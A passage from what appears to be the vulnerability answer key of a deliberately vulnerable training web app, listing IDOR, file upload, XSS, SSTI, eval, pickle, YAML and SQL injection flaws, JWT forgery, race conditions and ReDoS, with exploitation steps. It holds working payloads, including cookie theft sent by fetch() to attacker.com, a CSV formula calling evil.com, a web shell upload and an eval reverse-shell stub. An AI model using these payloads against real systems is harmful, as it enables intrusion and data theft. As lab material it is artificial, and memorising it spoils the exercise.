    title: 'IDOR — View Private Posts by Direct ID',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/social.py — GET /api/posts/{post_id}',
    endpoint: 'GET /api/posts/{post_id}',
    description: 'The feed respects post visibility (public/followers/private) and user privacy settings. However, the post detail endpoint (GET /api/posts/{id}) returns ANY post regardless of visibility or whether the requesting user follows the author. Private posts and followers-only posts are fully accessible by ID.',
    exploitation: `1. Login as guest (guest:guest123) — follows nobody
2. GET /feed → only sees public posts
3. Access private posts by ID:

   GET /api/posts/3  → emily_r's followers-only post (not following her!)
   GET /api/posts/7  → jsmith's private post
   GET /api/posts/15 → emily_r's private post

4. Enumerate all posts: /api/posts/1, /api/posts/2, ...
5. Even private account posts with "private" visibility are returned in full`,
    impact: 'Complete bypass of post visibility controls. All private and followers-only content is accessible to any authenticated user.',
  },
  {
    id: 'BAC-016',
    title: 'IDOR — View Followers/Following of Any User',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/follows.py — GET /api/users/{id}/followers, /following',
    endpoint: 'GET /api/users/{user_id}/followers',
    description: 'Any user can view the complete followers and following lists of any other user, including private accounts. There is no privacy check — the social graph is fully exposed.',
    exploitation: `1. Login as any user
2. View a private account's social graph:

   GET /api/users/4/followers → emily_r's followers (she's a private account!)
   GET /api/users/4/following → who emily_r follows

3. Map the entire social graph by iterating:
   for each user_id:
     GET /api/users/{id}/followers
     GET /api/users/{id}/following`,
    impact: 'Full social graph exposure including private accounts. Enables social engineering and relationship mapping.',
  },

  // ═══ Additional: File Upload Vulnerabilities ═══
  {
    id: 'FILE-001',
    title: 'Unrestricted File Upload — No Type Validation',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/api/routes/files.py — POST /api/files/upload',
    endpoint: 'POST /api/files/upload',
    description: 'The file upload endpoint accepts any file type without restriction. An attacker can upload executable files (.php, .jsp, .html, .exe, .sh), web shells, or malicious documents.',
    exploitation: `1. Upload a PHP web shell:
   curl -X POST http://target:9000/api/files/upload?project_id=0 \\
     -H "Authorization: Bearer <token>" \\
     -F "file=@shell.php"

2. Upload malicious HTML:
   <html><script>alert('Uploaded XSS')</script></html>

3. No content-type verification — rename .exe to .jpg, still accepted`,
    impact: 'Potential remote code execution if uploaded files are served by a PHP/JSP server. Stored XSS via uploaded HTML files.',
  },
  {
    id: 'FILE-002',
    title: 'Path Traversal in File Upload',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/files.py — upload_file() uses filename directly',
    endpoint: 'POST /api/files/upload',
    description: 'The uploaded file\'s original filename is used directly when saving to disk (UPLOAD_DIR / filename). By crafting the filename with path traversal sequences, an attacker can write files outside the upload directory.',
    exploitation: `1. Upload a file with a traversal filename:

   curl -X POST http://target:9000/api/files/upload?project_id=0 \\
     -H "Authorization: Bearer <token>" \\
     -F "file=@malicious.txt;filename=../../etc/cron.d/backdoor"

2. Or overwrite application files:
   filename=../app/main.py

3. Or plant a web shell:
   filename=../../var/www/html/shell.php`,
    impact: 'Arbitrary file write on the server. Can lead to RCE by overwriting application code or planting web shells.',
  },

  // ═══ Additional: Social Feature Vulnerabilities ═══
  {
    id: 'SOCIAL-001',
    title: 'Stored XSS — Post Content',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/social.py — POST /api/posts (no sanitization)\nFrontend: pages/Feed.tsx, PostDetail.tsx — dangerouslySetInnerHTML on post.content',
    endpoint: 'POST /api/posts',
    description: 'Post content is stored without any sanitization. The frontend renders post content using dangerouslySetInnerHTML in both the feed and post detail pages. Any JavaScript/HTML in post content executes in every viewer\'s browser.',
    exploitation: `1. Login as any user (jsmith:password123)
2. Create a post with XSS payload:

   POST /api/posts
   {
     "content": "Check out this cool feature! <img src=x onerror='fetch(\"https://attacker.com/steal?c=\"+document.cookie)'>",
     "visibility": "public"
   }

3. The XSS fires for every user who sees the post in their feed
4. Public visibility = maximum blast radius
5. Cookie stealing, keylogging, session hijacking all possible`,
    impact: 'Stored XSS with wide blast radius. Public posts are shown on the explore page to ALL users. Can steal sessions, deface the platform, or chain with CSRF.',
  },
  {
    id: 'SOCIAL-002',
    title: 'Stored XSS — Post Comments',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/social.py — POST /api/posts/{id}/comments\nFrontend: pages/PostDetail.tsx — dangerouslySetInnerHTML on comment.content',
    endpoint: 'POST /api/posts/{post_id}/comments',
    description: 'Comment content is stored without sanitization and rendered via dangerouslySetInnerHTML on the post detail page.',
    exploitation: `1. Find a popular post (high likes count)
2. Add a comment with XSS:

   POST /api/posts/1/comments
   { "content": "<svg onload=alert('XSS via comment')>" }

3. Everyone who views the post detail page triggers the payload
4. Target high-traffic posts for maximum impact`,
    impact: 'XSS in post comment context. Can target specific post authors or high-traffic posts for maximum victim count.',
  },
  {
    id: 'SOCIAL-003',
    title: 'Privacy Bypass — Private Account Posts via Direct API',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/social.py — GET /api/posts/{post_id} (no visibility/privacy check)',
    endpoint: 'GET /api/posts/{post_id}',
    description: 'The user posts endpoint (GET /api/users/{id}/posts) correctly enforces privacy — private accounts only show public posts to non-followers. The feed also respects visibility. But the individual post endpoint (GET /api/posts/{id}) skips all privacy checks.',
    exploitation: `1. emily_r (user ID 4) is a private account
2. Login as guest (not following emily_r)
3. GET /api/users/4/posts → only sees emily_r's public posts (correct!)
4. GET /feed → emily_r's private posts filtered out (correct!)
5. But enumerate posts directly:

   GET /api/posts/3  → emily_r's followers-only post ← BYPASS!
   GET /api/posts/9  → emily_r's private post ← BYPASS!

6. The privacy setting is cosmetic — all content accessible via enumeration`,
    impact: 'Complete privacy bypass. Private accounts offer no real protection — all posts are accessible by ID enumeration.',
  },
  {
    id: 'SOCIAL-004',
    title: 'Invite Token Never Expires',
    difficulty: 'Hard',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/organizations.py — POST /api/orgs/{id}/join (no expiry check)',
    endpoint: 'POST /api/orgs/{org_id}/join?token={token}',
    description: 'Organization invite tokens have no expiration date. Once an invite is created, the token remains valid indefinitely. Old tokens can be reused long after the intended recipient has changed roles or left the organization.',
    exploitation: `1. Admin creates invite:
   POST /api/orgs/1/invite { "email": "temp@contractor.com", "role": "admin" }
   → returns token: "abc123..."

2. Token is used or intercepted
3. Months later, anyone with the token can still join:
   POST /api/orgs/1/join?token=abc123
   → Joins as admin role (from original invite)

4. If invite logs are leaked/exposed, all historical tokens work`,
    impact: 'Persistent unauthorized access vector. Old invite tokens become permanent backdoors into organizations.',
  },

  // ═══ NEW: A01 — Advanced Broken Access Control ═══
  {
    id: 'BAC-017',
    title: 'HTTP Method Override Bypass',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/main.py — MethodOverrideMiddleware reads X-HTTP-Method-Override header',
    endpoint: 'Any endpoint with method-specific auth',
    description: 'The application includes middleware that reads X-HTTP-Method-Override header and rewrites the HTTP method. If a DELETE endpoint requires admin auth but POST does not, sending POST with X-HTTP-Method-Override: DELETE bypasses the method-level access control.',
    exploitation: `1. Identify an admin-only DELETE endpoint (e.g. admin user management)
2. Send a POST request with the override header:

   POST /api/admin/users/3
   X-HTTP-Method-Override: DELETE
   Authorization: Bearer <non_admin_token>

3. The middleware rewrites POST to DELETE before routing
4. If auth is applied at the route level (not middleware), the override may bypass it

5. Also works for other method swaps:
   GET + X-HTTP-Method-Override: PATCH → bypass read-only restrictions`,
    impact: 'Access control bypass via method spoofing. Can escalate read-only access to write/delete operations.',
  },
  {
    id: 'BAC-018',
    title: 'Open Redirect via next Parameter',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/main.py — GET /redirect?next={url}',
    endpoint: 'GET /redirect?next={url}',
    description: 'The /redirect endpoint accepts a "next" parameter and redirects the user to that URL without any validation. Attackers can craft phishing links that appear to originate from the legitimate domain.',
    exploitation: `1. Craft a malicious URL:
   http://localhost:9000/redirect?next=https://evil.com/phishing

2. Send this link to a victim — it looks like a legitimate site URL
3. Victim clicks → redirected to attacker's phishing page
4. Can steal credentials via a fake NexusCloud login page

5. Also useful for OAuth token theft:
   /redirect?next=https://evil.com/steal?token=...`,
    impact: 'Phishing attacks using trusted domain. Can be chained with OAuth flows to steal authorization codes.',
  },
  {
    id: 'BAC-019',
    title: 'Excessive Data Exposure — Password Hash & API Keys in Response',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/all-data',
    endpoint: 'GET /api/internal/all-data?resource=users',
    description: 'The internal data export endpoint returns full user objects including password_hash and api_key fields. Any authenticated user can access this endpoint.',
    exploitation: `1. Login as any user
2. GET /api/internal/all-data?resource=users

3. Response includes for every user:
   {
     "id": 1,
     "username": "admin",
     "password_hash": "$2b$12$...",
     "api_key": "abc123def456..."
   }

4. Crack password hashes offline with hashcat/john
5. Use API keys directly for impersonation`,
    impact: 'Full credential exposure for all users. Password hashes can be cracked offline. API keys enable direct impersonation.',
  },
  {
    id: 'BAC-020',
    title: 'Force Browsing — Unprotected Internal Endpoints',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/internal.py — /api/internal/backup/{filename}',
    endpoint: 'GET /api/internal/backup/config.bak',
    description: 'The internal backup endpoint serves sensitive configuration files (db.sql.bak, config.bak, .env.bak) without any authentication. Anyone who discovers these URLs can access secrets, database dumps, and credentials.',
    exploitation: `1. No authentication required:

   GET /api/internal/backup/config.bak
   → JWT_SECRET, SMTP credentials, AWS keys

   GET /api/internal/backup/db.sql.bak
   → Database schema + sample data with password hashes

   GET /api/internal/backup/.env.bak
   → Environment variables including all secrets

2. Discover these via /robots.txt or directory brute-forcing`,
    impact: 'Complete exposure of application secrets, credentials, and database structure without authentication.',
  },
  {
    id: 'BAC-021',
    title: 'OpenAPI / Swagger Documentation Exposed',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/main.py — FastAPI default docs_url="/docs"',
    endpoint: 'GET /docs, GET /openapi.json',
    description: 'The FastAPI interactive documentation (Swagger UI) is accessible without authentication at /docs. It reveals every API endpoint, request/response schemas, and parameter types — providing attackers a complete API map.',
    exploitation: `1. Open in browser (no auth required):
   http://localhost:9000/docs
   http://localhost:9000/redoc

2. Download the full API schema:
   http://localhost:9000/openapi.json

3. This reveals all endpoints, including:
   - /api/admin/* (admin-only endpoints)
   - /api/internal/* (internal tools)
   - All parameter names and types
   - Request body schemas

4. Use this map to systematically test every endpoint`,
    impact: 'Full API surface area exposure. Provides attackers a complete roadmap of all endpoints and their parameters.',
  },

  // ═══ NEW: A02 — Advanced Cryptographic Failures ═══
  {
    id: 'CRYPTO-003',
    title: 'Sensitive Data in JWT Payload',
    difficulty: 'Medium',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/api/routes/auth.py — login() embeds email, username, department, org_id in JWT claims',
    endpoint: 'POST /api/auth/login',
    description: 'The JWT access token contains PII (email, username, department, org_id) in its payload. JWT payloads are base64-encoded, NOT encrypted — anyone with the token can decode and read the claims without knowing the secret.',
    exploitation: `1. Login and get a JWT token
2. Decode the payload (no secret needed):

   echo "eyJ..." | cut -d. -f2 | base64 -d
   → {"sub": "3", "role": "user", "email": "john.smith@nexuscloud.io",
      "username": "jsmith", "department": "Engineering", "org_id": 1}

3. Or use jwt.io to decode the token
4. PII is visible to anyone who intercepts the token (logs, browser, proxies)`,
    impact: 'PII exposure to any token interceptor. Email, department, and org affiliation leaked in every API request.',
  },
  {
    id: 'CRYPTO-004',
    title: 'Weak Password Reset Token (Predictable MD5)',
    difficulty: 'Medium',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/api/routes/auth.py — forgot_password() uses MD5(email + timestamp)',
    endpoint: 'POST /api/auth/forgot-password',
    description: 'Password reset tokens are generated as MD5(email + unix_timestamp). Since both the email and approximate time are known to the attacker, the token can be predicted.',
    exploitation: `1. Request a password reset:
   POST /api/auth/forgot-password { "email": "admin@nexuscloud.io" }

2. Note the approximate time of the request (unix timestamp)
3. Generate candidate tokens:

   import hashlib, time
   ts = int(time.time())
   for t in range(ts-5, ts+5):
       token = hashlib.md5(f"admin@nexuscloud.io{t}".encode()).hexdigest()
       # try POST /api/auth/reset-password with each token

4. Within ~10 attempts, the correct token is found
5. Reset the admin's password`,
    impact: 'Account takeover via predictable reset token. Attacker can reset any user\'s password knowing only their email.',
  },
  {
    id: 'CRYPTO-005',
    title: 'Hardcoded Encryption Key in Source Code',
    difficulty: 'Medium',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/core/config.py — JWT_SECRET = "supersecretkey123" used for all crypto',
    endpoint: 'All endpoints using JWT',
    description: 'The same hardcoded string "supersecretkey123" is used as the JWT signing key, and it is also exposed through the debug endpoint and .env file. This key never changes between deployments.',
    exploitation: `1. Discover the key via any of these methods:
   - GET /.env → JWT_SECRET field
   - GET /api/admin/debug → jwt_secret field
   - GET /api/internal/backup/config.bak → JWT_SECRET field
   - Brute-force with common wordlists

2. Once known, forge ANY JWT:
   import jwt
   token = jwt.encode({"sub":"1","role":"admin","exp":9999999999}, "supersecretkey123")

3. The key is identical across all installations of this app`,
    impact: 'Universal key compromise. Any attacker who discovers the key can forge tokens for any user on any deployment.',
  },
  {
    id: 'CRYPTO-006',
    title: 'Password Reset Token Not Invalidated After Use',
    difficulty: 'Medium',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/api/routes/auth.py — reset_password() marks token used but never checks the flag',
    endpoint: 'POST /api/auth/reset-password',
    description: 'After a password reset, the token is marked as used=True in the database, but the reset endpoint only checks if the token exists — never verifying the used flag. The same token can reset the password unlimited times.',
    exploitation: `1. Request a password reset and get a token
2. Use the token to reset the password:
   POST /api/auth/reset-password { "token": "abc123", "new_password": "hacked1" }
   → Success

3. Days later, use the SAME token again:
   POST /api/auth/reset-password { "token": "abc123", "new_password": "hacked2" }
   → Still works! Token is never truly invalidated

4. Also: tokens never expire — no timestamp check`,
    impact: 'Persistent account takeover. A single intercepted reset token provides indefinite password control.',
  },

  // ═══ NEW: A03 — Advanced Injection ═══
  {
    id: 'INJ-007',
    title: 'Server-Side Template Injection (Jinja2)',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/render-template uses Template(user_input).render()',
    endpoint: 'POST /api/internal/render-template',
    description: 'The template preview endpoint passes user input directly to Jinja2 Template() constructor. An attacker can inject template expressions to read server configuration, environment variables, and achieve Remote Code Execution.',
    exploitation: `1. Basic detection — arithmetic:
   POST /api/internal/render-template
   { "template": "Hello {{7*7}}" }
   → "Hello 49"

2. Read config:
   { "template": "{{config}}" }

3. Remote Code Execution via class traversal:
   { "template": "{{''.__class__.__mro__[1].__subclasses__()}}" }

4. Execute system commands:
   { "template": "{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}" }
   (where X is the index of subprocess.Popen)

Note: Requires admin access.`,
    impact: 'Remote Code Execution on the server. Full system compromise via template injection.',
  },
  {
    id: 'INJ-008',
    title: 'Python eval() Remote Code Execution',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/calculate uses eval(user_input)',
    endpoint: 'POST /api/internal/calculate',
    description: 'The calculator endpoint uses Python eval() directly on user-supplied expressions. Any Python expression can be executed, including system commands, file operations, and arbitrary code.',
    exploitation: `1. Basic test:
   POST /api/internal/calculate
   { "expression": "2+2" } → result: "4"

2. Read files:
   { "expression": "open('/etc/passwd').read()" }

3. Execute system commands:
   { "expression": "__import__('os').popen('id').read()" }

4. Import and execute anything:
   { "expression": "__import__('subprocess').check_output(['whoami']).decode()" }

5. Reverse shell:
   { "expression": "__import__('os').system('bash -c ...')" }`,
    impact: 'Unrestricted Remote Code Execution. eval() allows any Python code to run on the server.',
  },
  {
    id: 'INJ-009',
    title: 'Unsafe YAML Deserialization',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/import-yaml uses yaml.load(FullLoader)',
    endpoint: 'POST /api/internal/import-yaml',
    description: 'The YAML import endpoint uses yaml.load() with FullLoader instead of yaml.safe_load(). FullLoader allows instantiation of arbitrary Python objects, enabling Remote Code Execution.',
    exploitation: `1. Normal YAML import:
   POST /api/internal/import-yaml
   { "content": "name: test\\nversion: 1.0" }

2. RCE via !!python/object/apply:
   { "content": "!!python/object/apply:os.system ['id']" }

3. Read files:
   { "content": "!!python/object/apply:builtins.open ['flag.txt']" }

4. The safe alternative is yaml.safe_load() which blocks these tags

Note: Requires admin access.`,
    impact: 'Remote Code Execution via YAML deserialization. Arbitrary Python objects can be instantiated.',
  },
  {
    id: 'INJ-010',
    title: 'Pickle Deserialization RCE',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/import-data uses pickle.loads()',
    endpoint: 'POST /api/internal/import-data',
    description: 'The data import endpoint accepts base64-encoded pickle data and deserializes it with pickle.loads(). Pickle deserialization in Python executes arbitrary code via __reduce__ methods.',
    exploitation: `1. Generate a malicious pickle payload:

   import pickle, base64, os
   class Exploit:
       def __reduce__(self):
           return (os.system, ('id',))
   payload = base64.b64encode(pickle.dumps(Exploit())).decode()

2. Send the payload:
   POST /api/internal/import-data
   { "data": "<base64_payload>" }

3. The server executes os.system('id') during deserialization
4. Any Python callable can be invoked this way

Note: Requires admin access. Python pickle is NEVER safe for untrusted data.`,
    impact: 'Remote Code Execution via pickle deserialization. Complete server compromise.',
  },
  {
    id: 'INJ-011',
    title: 'Second-Order SQL Injection',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/user-report uses stored username in raw query',
    endpoint: 'GET /api/internal/user-report?username={payload}',
    description: 'The user report endpoint constructs a raw SQL query using the username parameter via string interpolation. While the registration endpoint safely stores usernames using parameterized queries, this report endpoint re-uses them unsafely.',
    exploitation: `1. Register a user with SQL payload as username:
   POST /api/auth/register
   { "username": "admin'--", "email": "x@x.com", "password": "test" }

2. Or inject directly via the query parameter:
   GET /api/internal/user-report?username=' UNION SELECT id,username,password_hash,role,api_key FROM users--

3. Extract all credentials from the database
4. This is "second-order" because the payload is stored safely but used unsafely later`,
    impact: 'Full database extraction including credentials. Second-order injection is harder to detect with WAFs.',
  },
  {
    id: 'INJ-012',
    title: 'Blind SQL Injection — Boolean-Based',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/check-exists uses raw SQL',
    endpoint: 'GET /api/internal/check-exists?table=users&column=username&value={payload}',
    description: 'The availability checker endpoint uses raw SQL with all three parameters (table, column, value) injected via string interpolation. While the response only returns true/false, boolean-based blind injection can extract the entire database character by character.',
    exploitation: `1. Test for injection:
   GET /api/internal/check-exists?table=users&column=username&value=' OR '1'='1
   → {"exists": true}

2. Boolean-based extraction of admin password:
   ?value=' OR (SELECT substr(password_hash,1,1) FROM users WHERE id=1)='$'--
   → true (first char is $)

3. Automated extraction with sqlmap:
   sqlmap -u "http://target:9000/api/internal/check-exists?table=users&column=username&value=test" -p value --technique=B

4. Table/column parameters are also injectable:
   ?table=users WHERE 1=1 UNION SELECT password_hash FROM users--&column=x&value=x`,
    impact: 'Complete database extraction via boolean-based blind SQLi. Slower but works even when no data is directly returned.',
  },
  {
    id: 'INJ-013',
    title: 'ORM Filter Injection',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/query passes all query params as filter kwargs',
    endpoint: 'GET /api/internal/query?{arbitrary_field}={value}',
    description: 'The flexible query endpoint passes all URL query parameters directly as filter conditions to the SQLModel ORM. An attacker can filter by any model field including sensitive ones like password_hash and api_key.',
    exploitation: `1. Filter by any field — extract admin by role:
   GET /api/internal/query?role=admin

2. Filter by API key (confirm a guessed/leaked key):
   GET /api/internal/query?api_key=<suspected_key>
   → returns user if key matches

3. Enumerate password hashes:
   GET /api/internal/query?password_hash=$2b$12$...
   → returns matching user

4. Brute-force sensitive fields character by character
5. Combine filters: ?role=admin&department=Engineering`,
    impact: 'Sensitive field enumeration and data leakage via arbitrary ORM filter injection.',
  },
  {
    id: 'INJ-014',
    title: 'CRLF / Log Injection',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/log-action logs unsanitized user input',
    endpoint: 'POST /api/internal/log-action',
    description: 'The logging endpoint writes user-supplied action and details directly to the application log without sanitizing newline characters. An attacker can inject fake log entries to cover tracks or frame other users.',
    exploitation: `1. Inject a fake log entry:
   POST /api/internal/log-action
   {
     "action": "legitimate action\\n[INFO] [USER:1] Action: admin_login | Details: Successful admin authentication",
     "details": "normal"
   }

2. The log now contains a fake admin login entry
3. Cover tracks by injecting "[INFO] No suspicious activity detected"
4. Frame another user by forging entries with their user ID
5. CRLF in HTTP headers (if logs include request headers)`,
    impact: 'Log tampering, forensic evidence pollution, and audit trail manipulation.',
  },
  {
    id: 'INJ-015',
    title: 'HTTP Parameter Pollution',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/resource?id=X&id=Y uses last value',
    endpoint: 'GET /api/internal/resource?id=1&id=2',
    description: 'When duplicate query parameters are sent, the endpoint uses the LAST value for data retrieval. If access control checks use the first value, an attacker can bypass authorization by providing an authorized ID first and a target ID last.',
    exploitation: `1. Send duplicate id parameters:
   GET /api/internal/resource?id=3&id=1

2. If access control checks ids[0] (3 = your ID), you pass the check
3. But data is fetched using ids[-1] (1 = admin's ID)
4. Response reveals admin data despite authorization check on your ID

5. The response helpfully shows: "params_received": ["3", "1"]`,
    impact: 'Access control bypass via parameter pollution. Can read data belonging to other users.',
  },
  {
    id: 'INJ-016',
    title: 'CSV Formula Injection in Export',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/export-csv exports user data without sanitizing formula chars',
    endpoint: 'GET /api/internal/export-csv?resource=users',
    description: 'The CSV export includes user-controlled fields (bio, full_name) without sanitizing formula-trigger characters (=, +, -, @). When opened in Excel or Google Sheets, these execute as formulas.',
    exploitation: `1. First, inject a formula into your bio:
   PATCH /api/users/3
   { "bio": "=HYPERLINK(\\"https://evil.com/steal?c=\\"&A1,\\"Click for bonus\\")" }

2. Or a more dangerous payload:
   { "bio": "=cmd|'/C calc'!A1" }

3. Admin exports user data:
   GET /api/internal/export-csv?resource=users

4. Admin opens the CSV in Excel
5. The formula executes — could open URLs, run commands, or exfiltrate data`,
    impact: 'Code execution on the admin\'s machine when they open the exported CSV in a spreadsheet application.',
  },
  {
    id: 'INJ-017',
    title: 'Stored XSS via Image URL Attribute',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/social.py — POST /api/posts accepts image_url without validation\nFrontend: pages/Feed.tsx — image_url rendered in <img> tag',
    endpoint: 'POST /api/posts',
    description: 'The post image_url field is stored without validation and rendered in <img> tags on the frontend. While not directly XSS via src attribute, a javascript: URL or onerror handler in combination with crafted HTML could be exploited.',
    exploitation: `1. Create a post with a malicious image URL:
   POST /api/posts
   {
     "content": "Nice photo <img src='x' onerror='alert(1)'>",
     "image_url": "javascript:alert('XSS')",
     "visibility": "public"
   }

2. The content field renders via dangerouslySetInnerHTML
3. The onerror fires when the broken image fails to load
4. Combine with content field for maximum payload flexibility`,
    impact: 'Additional XSS vector via image URL field. Extends attack surface beyond just content.',
  },

  // ═══ NEW: A04 — Advanced Insecure Design ═══
  {
    id: 'DESIGN-004',
    title: 'Race Condition — Coupon Double-Spend',
    difficulty: 'Hard',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/redeem-coupon has no locking',
    endpoint: 'POST /api/internal/redeem-coupon',
    description: 'The coupon redemption endpoint checks if used_count < max_uses, then increments the counter. With no database locking, sending many parallel requests causes all of them to read used_count=0 and all succeed — redeeming a single-use coupon multiple times.',
    exploitation: `1. Find a single-use coupon: WELCOME25 (discount: $25, max_uses: 1)
2. Send 20 parallel redemption requests:

   # Using bash parallel:
   for i in $(seq 1 20); do
     curl -X POST http://target:9000/api/internal/redeem-coupon \\
       -H "Authorization: Bearer <token>" \\
       -H "Content-Type: application/json" \\
       -d '{"code":"WELCOME25"}' &
   done

3. Multiple requests pass the used_count check simultaneously
4. Result: $25 coupon redeemed 5-15 times → $125-375 in credits
5. Check wallet: GET /api/internal/wallet → balance far exceeds expected`,
    impact: 'Financial fraud via race condition. Single-use discounts/coupons applied multiple times.',
  },
  {
    id: 'DESIGN-005',
    title: 'Race Condition — TOCTOU Balance Transfer',
    difficulty: 'Hard',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/transfer-credits has TOCTOU gap',
    endpoint: 'POST /api/internal/transfer-credits',
    description: 'The credit transfer endpoint checks the sender\'s balance, then deducts. Two simultaneous transfers each see sufficient balance and both succeed, overdrawing the account (Time-of-Check/Time-of-Use).',
    exploitation: `1. Check starting balance:
   GET /api/internal/wallet → balance: 100.0

2. Send two simultaneous transfers of 100 credits:
   # Both check balance=100, both pass the >= check, both deduct

   curl -X POST .../transfer-credits -d '{"to_user_id":2,"amount":100}' &
   curl -X POST .../transfer-credits -d '{"to_user_id":3,"amount":100}' &

3. Both succeed — sender balance becomes -100
4. Transferred 200 credits total from a 100-credit wallet
5. The proper fix requires SELECT ... FOR UPDATE or atomic operations`,
    impact: 'Financial loss via double-spending. Attacker can drain more funds than available in their wallet.',
  },
  {
    id: 'DESIGN-006',
    title: 'Negative Value Price Manipulation',
    difficulty: 'Medium',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/purchase-credits accepts negative amounts',
    endpoint: 'POST /api/internal/purchase-credits?amount=-1000',
    description: 'The credit purchase endpoint adds the amount to the user\'s wallet without validating that the amount is positive. Negative amounts are accepted, effectively giving free credits.',
    exploitation: `1. Purchase negative credits:
   POST /api/internal/purchase-credits?amount=-50
   → This SUBTRACTS from balance (paying nothing)

2. Wait, that's the wrong direction. Let's try:
   POST /api/internal/purchase-credits?amount=99999
   → No payment validation — credits just added!

3. Or the transfer endpoint with amount=0.0001:
   Micro-transactions that add up

4. Also: transfer negative amounts to steal from others:
   POST /api/internal/transfer-credits
   { "to_user_id": 2, "amount": -100 }
   → Takes 100 from user 2, adds to your wallet`,
    impact: 'Unlimited free credits. Business logic bypass allows arbitrary balance manipulation.',
  },
  {
    id: 'DESIGN-007',
    title: 'ReDoS — Regular Expression Denial of Service',
    difficulty: 'Medium',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/validate-email uses evil regex',
    endpoint: 'POST /api/internal/validate-email',
    description: 'The email validation endpoint uses a regex pattern with catastrophic backtracking: ^([a-zA-Z0-9]+)*@. Specially crafted inputs cause exponential processing time, freezing the server.',
    exploitation: `1. Send a string that triggers backtracking:
   POST /api/internal/validate-email
   { "email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" }

2. The regex engine backtracks 2^30 times before failing
3. Server thread hangs for 30+ seconds
4. Send 10 parallel requests → server DoS

5. The pattern (X+)* is a classic catastrophic backtracking anti-pattern
6. Fix: use a simple regex or library like email-validator`,
    impact: 'Server denial of service via single crafted request. Can be sustained with repeated requests.',
  },
  {
    id: 'DESIGN-008',
    title: 'Inconsistent Validation Across Endpoints',
    difficulty: 'Medium',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/update-contact vs POST /api/auth/register',
    endpoint: 'POST /api/internal/update-contact',
    description: 'The registration endpoint validates email format, but the internal contact update endpoint accepts any string as an email. This inconsistency lets users bypass email validation post-registration.',
    exploitation: `1. Registration validates email:
   POST /api/auth/register { "email": "notvalid" } → 422 error

2. But after registration, update contact freely:
   POST /api/internal/update-contact?email=<script>alert(1)</script>
   → Success! Email set to XSS payload

3. Or set email to another user's email:
   POST /api/internal/update-contact?email=admin@nexuscloud.io
   → Now you receive the admin's password resets

4. Or set to SQL payload:
   POST /api/internal/update-contact?email=' OR '1'='1`,
    impact: 'Validation bypass enables injection payloads, account takeover via email swap, and data integrity violations.',
  },
  {
    id: 'DESIGN-009',
    title: 'Unbounded Query — No Maximum Limit',
    difficulty: 'Easy',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/internal.py — GET /api/internal/all-data has no max limit',
    endpoint: 'GET /api/internal/all-data?limit=999999999',
    description: 'The internal data endpoint accepts any limit value with no upper bound. Setting limit to a very large number forces the database to attempt loading all records, potentially causing memory exhaustion and DoS.',
    exploitation: `1. Request all data at once:
   GET /api/internal/all-data?resource=users&limit=999999999

2. The database attempts to load 999999999 records
3. Server memory consumption spikes
4. Combined with large offsets, can cause slow queries
5. Repeated requests → denial of service`,
    impact: 'Server resource exhaustion and denial of service via unbounded database queries.',
  },
  {
    id: 'DESIGN-010',
    title: 'Unlimited API Key Regeneration',
    difficulty: 'Medium',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/users.py — GET /api/users/{id}/api-key generates new key each call',
    endpoint: 'GET /api/users/{user_id}/api-key',
    description: 'The API key endpoint generates a new key every time it is called, without invalidating the previous one. All generated keys remain valid simultaneously, and there is no limit on how many can be generated.',
    exploitation: `1. Call the endpoint repeatedly:
